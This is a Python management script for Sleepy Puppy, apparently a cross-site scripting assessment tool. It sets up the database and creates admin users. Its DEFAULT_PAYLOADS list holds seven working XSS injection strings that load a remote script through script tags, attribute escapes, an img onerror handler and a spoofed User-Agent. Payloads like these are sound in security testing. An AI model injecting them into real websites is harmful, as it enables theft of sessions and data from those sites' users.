#!/usr/bin/env python
import os
import time
import json
import sys
import getpass
from random import randint

from flask_script import Command, Option
from flask_script.commands import ShowUrls, Clean
from flask.ext.script import Manager, Server
from sleepypuppy.admin.admin.models import Administrator
from sleepypuppy import app, db

manager = Manager(app)

@manager.shell
def make_shell_context():
    """
    Creates a python REPL with several default imports
    in the context of the app
    """
    return dict(app=app)

@manager.command
def create_db():
    """
    Creates a database with all of the tables defined in
    your Alchemy models
    """
    db.create_all()

@manager.command
def drop_db():
    """
    Drops a database with all of the tables defined in
    your Alchemy models
    """
    db.drop_all()

@manager.command
def create_login(login):
    """
    Seed the database with some inital values
    """

    print 'creating admin user'

    if Administrator.query.filter_by(login=login).count():
        print 'user already exists!'
        return
    else:
        print "{}, enter your password!\n ".format(login)
        pw1 = getpass.getpass()
        pw2 = getpass.getpass(prompt="Confirm: ")
        if pw1 == pw2:
            admin_user = Administrator(login=login, password=pw1)
            print 'user: ' + login + ' created!'
        else:
            print 'passwords do not match!'
            sys.exit(1)

    db.session.add(admin_user)
    db.session.commit()
    return

from collections import namedtuple
DefaultPayload = namedtuple('DefaultPayload', ['payload', 'url', 'method', 'parameter', 'notes'])
DEFAULT_PAYLOADS=[
    DefaultPayload('<script src=$1></script>', None, 'GET', None, 'Generic'),
    DefaultPayload('</script><script src=$1>', None, 'GET', None, 'Reversed'),
    DefaultPayload('&lt;script src=$1&gt;&lt;/script&gt;', None, 'GET', None, 'Generic Encoded'),
    DefaultPayload('&lt;/script&gt;&lt;script src=$1&gt;', None, 'GET', None, 'Generic Reversed'),
    DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, 'GET', None, 'DOM Attribute Escape'),
    DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'For where "<script" is banned'),
    DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'Promiscuous User Agent')
]

@manager.command
def create_bootstrap_assessment(name="General", add_default_payloads=True):
    """
    Creates an assessment and attaches a few default payloads.
    """
    from sleepypuppy.admin.assessment.models import Assessment
    from sleepypuppy.admin.payload.models import Payload
    assessment = Assessment.query.filter(Assessment.name == name).first()
    if assessment:
        print("Assessment with name", name, "already exists.")
    else:
        assessment = Assessment(name=name)

    if add_default_payloads:
        for payload in DEFAULT_PAYLOADS:
            payload = Payload(
                payload=payload.payload,
                url=payload.url,
                method=payload.method,
                parameter=payload.parameter,
                notes=payload.notes
            )
            assessment.payloads.append(payload)
    db.session.add(assessment)
    db.session.commit()


@manager.command
def list_routes():
    output = []
    func_list = {}
    for rule in app.url_map.iter_rules():
        if rule.endpoint != 'static':
            func_list[rule.rule] = app.view_functions[rule.endpoint].__doc__

    from pprint import pprint
    pprint(func_list)

if __name__ == "__main__":
    manager.add_command("clean", Clean())
    manager.add_command("show_urls", ShowUrls())

    manager.run()
